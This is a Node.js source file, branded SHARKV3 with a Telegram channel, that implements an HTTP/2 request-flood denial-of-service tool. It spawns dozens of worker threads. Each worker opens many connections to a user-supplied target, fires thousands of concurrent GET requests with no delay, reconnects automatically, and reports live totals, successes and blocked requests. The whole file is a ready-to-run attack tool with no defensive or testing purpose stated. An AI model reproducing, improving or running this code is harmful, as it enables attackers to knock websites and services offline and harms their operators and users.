const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 16;
const INITIAL_CONNECTIONS = 30;
const POWER_MULTIPLIER = 3;
const MAX_INFLIGHT = 4000;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`SHARKV3! - NO CPU WARMUP .exx`);

    
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: true } });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: false } });
    }

    // Live Stats
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);
} else {
    const { target, duration, initial } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > end || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = client.request({ ':method': 'GET', ':path': '/' });

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
    }

    function createConnection() {
        if (Date.now() > end) return;

        let client;
        try {
            client = http2.connect(target);

            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 1000); // auto-recover fast
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 1000));

            client.on('connect', () => {
                for (let i = 0; i < 1500; i++) sendLoop(client, inflight); // boosted request flow
            });
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
